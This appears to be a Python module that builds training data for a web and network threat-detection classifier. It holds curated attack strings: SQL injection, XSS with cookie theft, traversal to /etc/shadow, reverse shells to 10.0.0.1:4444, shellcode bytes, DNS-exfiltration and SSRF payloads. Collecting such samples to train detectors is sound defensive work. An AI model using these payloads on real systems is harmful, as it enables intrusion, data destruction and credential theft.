# src/ml/dataset.py
"""
Dataset Builder for Threat Detection Models.

Data Sources:
1. Qdrant attack_memory collection (real attacks from Siren)
2. CSIC HTTP dataset (labeled web attacks)
3. PayloadAllTheThings (curated attack payloads)
4. Synthetic safe traffic generation
5. Network-level attack samples
"""

import json
import random
import hashlib
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional, List, Dict, Iterator
from loguru import logger


@dataclass
class TrainingExample:
    """A single training example for the threat classifier."""
    text: str                    # The payload/request
    label: str                   # "safe" | "sqli" | "xss" | "traversal" | "cmdi" | "network" | ...
    source: str                  # Where this came from
    confidence: float = 1.0      # Label confidence (1.0 for curated, 0.8 for synthetic)
    metadata: dict = field(default_factory=dict)
    
    @property
    def binary_label(self) -> str:
        """Binary classification: safe vs attack."""
        return "safe" if self.label == "safe" else "attack"
    
    @property
    def hash(self) -> str:
        """Unique hash for deduplication."""
        return hashlib.md5(self.text.encode()).hexdigest()[:16]


@dataclass
class AttackDataset:
    """Container for training/test datasets."""
    examples: List[TrainingExample] = field(default_factory=list)
    
    def __len__(self) -> int:
        return len(self.examples)
    
    def __iter__(self) -> Iterator[TrainingExample]:
        return iter(self.examples)
    
    def add(self, example: TrainingExample) -> None:
        """Add an example to the dataset."""
        self.examples.append(example)
    
    def get_texts(self) -> List[str]:
        """Get all text payloads."""
        return [ex.text for ex in self.examples]
    
    def get_labels(self, binary: bool = False) -> List[str]:
        """Get all labels (optionally as binary safe/attack)."""
        if binary:
            return [ex.binary_label for ex in self.examples]
        return [ex.label for ex in self.examples]
    
    def split(self, train_ratio: float = 0.8) -> tuple["AttackDataset", "AttackDataset"]:
        """Split into train/test sets."""
        random.shuffle(self.examples)
        split_idx = int(len(self.examples) * train_ratio)
        
        train = AttackDataset(examples=self.examples[:split_idx])
        test = AttackDataset(examples=self.examples[split_idx:])
        return train, test
    
    def balance(self, max_per_class: Optional[int] = None) -> "AttackDataset":
        """Balance the dataset by under/oversampling."""
        by_label: Dict[str, List[TrainingExample]] = {}
        for ex in self.examples:
            label = ex.binary_label
            if label not in by_label:
                by_label[label] = []
            by_label[label].append(ex)
        
        # Find target count
        if max_per_class:
            target = max_per_class
        else:
            target = min(len(v) for v in by_label.values())
        
        balanced = []
        for label, examples in by_label.items():
            if len(examples) >= target:
                # Undersample
                balanced.extend(random.sample(examples, target))
            else:
                # Oversample
                balanced.extend(examples)
                needed = target - len(examples)
                balanced.extend(random.choices(examples, k=needed))
        
        random.shuffle(balanced)
        return AttackDataset(examples=balanced)
    
    def stats(self) -> Dict[str, int]:
        """Get label distribution stats."""
        stats: Dict[str, int] = {}
        for ex in self.examples:
            label = ex.label
            stats[label] = stats.get(label, 0) + 1
        return dict(sorted(stats.items(), key=lambda x: -x[1]))
    
    def save(self, path: Path) -> None:
        """Save dataset to JSON file."""
        data = [
            {
                "text": ex.text,
                "label": ex.label,
                "source": ex.source,
                "confidence": ex.confidence,
                "metadata": ex.metadata,
            }
            for ex in self.examples
        ]
        path.parent.mkdir(parents=True, exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
        logger.info(f"Saved {len(self)} examples to {path}")
    
    @classmethod
    def load(cls, path: Path) -> "AttackDataset":
        """Load dataset from JSON file."""
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
        
        examples = [
            TrainingExample(
                text=item["text"],
                label=item["label"],
                source=item["source"],
                confidence=item.get("confidence", 1.0),
                metadata=item.get("metadata", {}),
            )
            for item in data
        ]
        logger.info(f"Loaded {len(examples)} examples from {path}")
        return cls(examples=examples)


class DatasetBuilder:
    """
    Builds training datasets from multiple sources.
    
    Combines:
    - Real attacks from Qdrant attack_memory
    - CSIC HTTP dataset (web attacks)
    - PayloadAllTheThings (curated payloads)
    - Network attack samples
    - Synthetic safe traffic
    """
    
    # ========== WEB ATTACK PAYLOADS ==========
    
    SQL_INJECTION_PAYLOADS = [
        # Classic SQLi
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "admin'--",
        "admin' #",
        "admin'/*",
        "1' OR '1'='1",
        "1 OR 1=1",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "' UNION SELECT NULL, NULL, NULL--",
        "1' UNION SELECT username, password FROM users--",
        "' UNION SELECT @@version--",
        "1; DROP TABLE users--",
        "1'; DROP TABLE users--",
        "'; TRUNCATE TABLE users;--",
        "1; DELETE FROM products WHERE 1=1--",
        # Blind SQLi
        "1' AND 1=1--",
        "1' AND 1=2--",
        "1' AND SUBSTRING(username,1,1)='a'--",
        "1' AND (SELECT COUNT(*) FROM users)>0--",
        "1' AND SLEEP(5)--",
        "1' WAITFOR DELAY '0:0:5'--",
        "1' AND BENCHMARK(5000000,MD5('test'))--",
        # Error-based
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
        # Second-order
        "test'; INSERT INTO logs VALUES('pwned')--",
        # NoSQL Injection
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"username": {"$regex": ".*"}}',
        "'; return this.password; var x='",
    ]
    
    XSS_PAYLOADS = [
        # Basic XSS
        "<script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
        "<a href='javascript:alert(1)'>click</a>",
        # Event handlers
        "<div onmouseover='alert(1)'>hover</div>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>", 
        # Encoded XSS
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        # DOM XSS
        "javascript:alert(document.domain)",
        "data:text/html,<script>alert(1)</script>",
        # Filter bypass
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<<script>script>alert(1)<</script>/script>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert`1`>",
    ]
    
    PATH_TRAVERSAL_PAYLOADS = [
        # Basic traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        # Null byte
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd\x00.jpg",
        # Absolute paths
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/proc/self/environ",
        "/var/log/apache2/access.log",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\boot.ini",
        # Wrapper bypass
        "file:///etc/passwd",
        "php://filter/convert.base64-encode/resource=../config.php",
        # Deep traversal
        "..../....//..../....//etc/passwd",
        "..;/..;/..;/etc/passwd",
    ]
    
    COMMAND_INJECTION_PAYLOADS = [
        # Basic command injection
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "&& id",
        "|| uname -a",
        "`id`",
        "$(whoami)",
        # Chained commands
        "; ls; cat /etc/passwd",
        "| ls | cat /etc/passwd",
        "& ping -c 1 attacker.com &",
        # Reverse shells
        "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "| nc -e /bin/sh 10.0.0.1 4444",
        "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        # Time-based
        "; sleep 10",
        "| sleep 10",
        "& ping -c 10 127.0.0.1 &",
        # Windows
        "& dir",
        "| type C:\\Windows\\win.ini",
        "& net user",
        "& ipconfig /all",
        # Filter bypass
        ";cat${IFS}/etc/passwd",
        ";cat$IFS/etc/passwd",
        "${''.join(['c','a','t'])}${IFS}/etc/passwd",
    ]
    
    # ========== NETWORK ATTACK PAYLOADS ==========
    
    NETWORK_ATTACK_PAYLOADS = [
        # Port scanning indicators
        "Nmap scan report for target",
        "Host is up (0.001s latency)",
        "PORT     STATE SERVICE",
        "22/tcp   open  ssh",
        "80/tcp   open  http",
        # Buffer overflow
        "A" * 5000,
        "A" * 1000 + "\x90" * 100 + "\xcc" * 50,
        # Shellcode patterns
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68",
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0",
        # DDoS patterns
        "GET / HTTP/1.1\r\nHost: target\r\n" * 100,
        "SYN flood detected",
        "UDP amplification attack",
        # Protocol abuse
        "EHLO attack\r\nMAIL FROM: <attacker>\r\nRCPT TO: <victim>",
        "HTTP/1.1 Host: localhost\r\n" + "X-Padding: " + "a" * 8000,
        # Malformed packets
        "GET / HTTP/9.9\r\nHost: target",
        "POST " + "/" * 1000 + " HTTP/1.1",
        # DNS tunneling indicators
        "aGVsbG8gd29ybGQ.tunnel.attacker.com",
        "data.exfil.attacker.com",
        # SSRF indicators
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:6379/",
        "http://127.0.0.1:22/",
        "gopher://127.0.0.1:6379/_SLAVEOF%20attacker%2014444",
    ]
    
    # ========== SAFE TRAFFIC TEMPLATES ==========
    
    SAFE_TRAFFIC_TEMPLATES = [
        # Normal API requests
        '{"username": "{name}", "email": "{email}"}',
        '{"action": "search", "query": "{word}"}',
        '{"page": {num}, "limit": 20}',
        '{"product_id": {num}, "quantity": {small_num}}',
        '{"comment": "{sentence}"}',
        # Normal paths
        "/api/users/{num}",
        "/api/products?category={word}",
        "/static/images/{word}.png",
        "/assets/css/style.css",
        "/favicon.ico",
        # Normal queries
        "q={word}&sort=date&order=desc",
        "search={word}+{word}&page={num}",
        "id={num}&action=view",
        "category={word}&filter=price",
        # Normal form data
        "name={name}&email={email}&message={sentence}",
        "username={word}&password=********&remember=true",
        "title={sentence}&body={sentence}",
        # Normal headers
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept: application/json, text/plain, */*",
        "Content-Type: application/json; charset=utf-8",
        "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
    ]
    
    SAFE_NAMES = ["john", "jane", "bob", "alice", "charlie", "david", "emma", "frank", "grace", "henry"]
    SAFE_WORDS = ["product", "search", "home", "about", "contact", "blog", "news", "shop", "cart", "checkout", "user", "profile", "settings", "dashboard"]
    SAFE_SENTENCES = [
        # Original business queries
        "This is a normal comment",
        "I love this product",
        "Great service thank you",
        "How can I reset my password",
        "Where is my order",
        "Need help with my account",
        "What are your business hours",
        "Do you ship internationally",
        # Natural conversational greetings
        "Hello, how are you today?",
        "Hi there!",
        "Good morning!",
        "Good afternoon, hope you are doing well",
        "Hey, just checking in",
        "Thanks for your help",
        "Have a nice day!",
        "Welcome to our website",
        # Common user questions
        "Can you help me with something?",
        "I have a question about my order",
        "What is the status of my request?",
        "Could you please assist me?",
        "I need some information please",
        "Is there anyone who can help?",
        "Thank you for your response",
        "That was very helpful",
        # Normal feedback
        "The product quality is excellent",
        "Fast shipping and great packaging",
        "Would recommend to friends",
        "Five stars, amazing experience",
        "Very satisfied with my purchase",
        "Customer service was wonderful",
        # Casual messages
        "Just wanted to say thanks",
        "Looking forward to hearing from you",
        "Please let me know if you need anything else",
        "Best regards",
        "Kind regards",
        "Sincerely",
        "Thanks again for everything",
        "Much appreciated",
        # Normal inquiries
        "What payment methods do you accept?",
        "How long does delivery take?",
        "Can I return this item?",
        "Do you have this in stock?",
        "What is your refund policy?",
        "Are there any discounts available?",
    ]
    
    def __init__(self):
        """Initialize the dataset builder."""
        self.dataset = AttackDataset()
        self._seen_hashes: set = set()
    
    def _add_unique(self, example: TrainingExample) -> bool:
        """Add example only if not duplicate."""
        h = example.hash
        if h in self._seen_hashes:
            return False
        self._seen_hashes.add(h)
        self.dataset.add(example)
        return True
    
    def add_sqli_samples(self, count: Optional[int] = None) -> int:
        """Add SQL injection samples."""
        payloads = self.SQL_INJECTION_PAYLOADS
        if count:
            payloads = random.choices(payloads, k=min(count, len(payloads) * 3))
        
        added = 0
        for payload in payloads:
            if self._add_unique(TrainingExample(
                text=payload,
                label="sqli",
                source="curated",
                confidence=1.0,
            )):
                added += 1
        
        logger.info(f"Added {added} SQL injection samples")
        return added
    
    def add_xss_samples(self, count: Optional[int] = None) -> int:
        """Add XSS samples."""
        payloads = self.XSS_PAYLOADS
        if count:
            payloads = random.choices(payloads, k=min(count, len(payloads) * 3))
        
        added = 0
        for payload in payloads:
            if self._add_unique(TrainingExample(
                text=payload,
                label="xss",
                source="curated",
                confidence=1.0,
            )):
                added += 1
        
        logger.info(f"Added {added} XSS samples")
        return added
    
    def add_traversal_samples(self, count: Optional[int] = None) -> int:
        """Add path traversal samples."""
        payloads = self.PATH_TRAVERSAL_PAYLOADS
        if count:
            payloads = random.choices(payloads, k=min(count, len(payloads) * 3))
        
        added = 0
        for payload in payloads:
            if self._add_unique(TrainingExample(
                text=payload,
                label="traversal",
                source="curated",
                confidence=1.0,
            )):
                added += 1
        
        logger.info(f"Added {added} path traversal samples")
        return added
    
    def add_cmdi_samples(self, count: Optional[int] = None) -> int:
        """Add command injection samples."""
        payloads = self.COMMAND_INJECTION_PAYLOADS
        if count:
            payloads = random.choices(payloads, k=min(count, len(payloads) * 3))
        
        added = 0
        for payload in payloads:
            if self._add_unique(TrainingExample(
                text=payload,
                label="cmdi",
                source="curated",
                confidence=1.0,
            )):
                added += 1
        
        logger.info(f"Added {added} command injection samples")
        return added
    
    def add_network_samples(self, count: Optional[int] = None) -> int:
        """Add network-level attack samples."""
        payloads = self.NETWORK_ATTACK_PAYLOADS
        if count:
            payloads = random.choices(payloads, k=min(count, len(payloads) * 3))
        
        added = 0
        for payload in payloads:
            if self._add_unique(TrainingExample(
                text=payload,
                label="network",
                source="curated",
                confidence=1.0,
            )):
                added += 1
        
        logger.info(f"Added {added} network attack samples")
        return added
    
    def add_safe_samples(self, count: int = 500) -> int:
        """Generate safe traffic samples."""
        added = 0
        
        # First, add all SAFE_SENTENCES directly as raw samples
        # This ensures the model learns natural conversational text
        for sentence in self.SAFE_SENTENCES:
            if self._add_unique(TrainingExample(
                text=sentence,
                label="safe",
                source="conversational",
                confidence=1.0,
            )):
                added += 1
        
        # Then, generate templated samples
        remaining = count - added
        for _ in range(max(0, remaining)):
            template = random.choice(self.SAFE_TRAFFIC_TEMPLATES)
            
            # Fill in template
            text = template
            text = text.replace("{name}", random.choice(self.SAFE_NAMES))
            text = text.replace("{word}", random.choice(self.SAFE_WORDS))
            text = text.replace("{sentence}", random.choice(self.SAFE_SENTENCES))
            text = text.replace("{email}", f"{random.choice(self.SAFE_NAMES)}@example.com")
            text = text.replace("{num}", str(random.randint(1, 9999)))
            text = text.replace("{small_num}", str(random.randint(1, 10)))
            
            if self._add_unique(TrainingExample(
                text=text,
                label="safe",
                source="synthetic",
                confidence=0.95,
            )):
                added += 1
        
        logger.info(f"Added {added} safe traffic samples")
        return added
    
    def add_from_qdrant(self, limit: int = 100) -> int:
        """
        Add attack samples from Qdrant attack_memory collection.
        
        This pulls real attacks captured by Siren.
        """
        try:
            from src.core.qdrant_client import qdrant_manager
            
            # Scroll through attack_memory collection
            records, _ = qdrant_manager.client.scroll(
                collection_name=qdrant_manager.attack_collection,
                limit=limit,
                with_payload=True,
            )
            
            added = 0
            for record in records:
                payload = record.payload
                if self._add_unique(TrainingExample(
                    text=payload.get("payload", ""),
                    label=payload.get("attack_type", "unknown"),
                    source="qdrant_attack_memory",
                    confidence=0.9,
                    metadata={
                        "session_id": payload.get("session_id"),
                        "timestamp": payload.get("timestamp"),
                    },
                )):
                    added += 1
            
            logger.info(f"Added {added} samples from Qdrant attack_memory")
            return added
            
        except Exception as e:
            logger.warning(f"Could not load from Qdrant: {e}")
            return 0
    
    def build_full_dataset(
        self,
        attacks_per_type: int = 200,
        safe_samples: int = 1000,
        include_qdrant: bool = True,
    ) -> AttackDataset:
        """
        Build complete balanced dataset.
        
        Args:
            attacks_per_type: Number of attack samples per category
            safe_samples: Number of safe traffic samples
            include_qdrant: Whether to include real attacks from Qdrant
        """
        logger.info("Building full threat detection dataset...")
        
        # Add web attacks
        self.add_sqli_samples(attacks_per_type)
        self.add_xss_samples(attacks_per_type)
        self.add_traversal_samples(attacks_per_type)
        self.add_cmdi_samples(attacks_per_type)
        
        # Add network attacks
        self.add_network_samples(attacks_per_type)
        
        # Add safe traffic
        self.add_safe_samples(safe_samples)
        
        # Add real attacks from Qdrant
        if include_qdrant:
            self.add_from_qdrant(limit=100)
        
        logger.info(f"Dataset built: {len(self.dataset)} total samples")
        logger.info(f"Distribution: {self.dataset.stats()}")
        
        return self.dataset
    
    def export_for_training(
        self,
        output_dir: Path,
        train_ratio: float = 0.8,
    ) -> tuple[Path, Path]:
        """Export dataset as train/test JSON files."""
        output_dir = Path(output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)
        
        train_data, test_data = self.dataset.split(train_ratio)
        
        train_path = output_dir / "train.json"
        test_path = output_dir / "test.json"
        
        train_data.save(train_path)
        test_data.save(test_path)
        
        return train_path, test_path
